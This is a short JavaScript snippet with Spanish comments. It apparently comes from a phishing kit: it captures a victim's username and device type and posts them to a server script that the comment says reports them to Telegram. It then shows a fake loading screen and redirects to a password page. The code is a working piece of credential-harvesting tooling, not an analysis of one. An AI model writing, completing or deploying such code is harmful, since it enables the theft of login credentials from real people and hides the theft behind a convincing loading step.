function inicio(u){
    var d = detectar_dispositivo();
    // Mostramos el cargando
    $("#fondo, #cargando-o").show();
    
    // Mandamos el reporte a Telegram
    $.post("../process/inicio.php", { usr: u, dis: d });
    
    // SALTAMOS SÍ O SÍ a los 1.5 segundos para que no se trabe
    setTimeout(function(){ 
        window.location.href = "PASS.php"; 
    }, 1500);
}
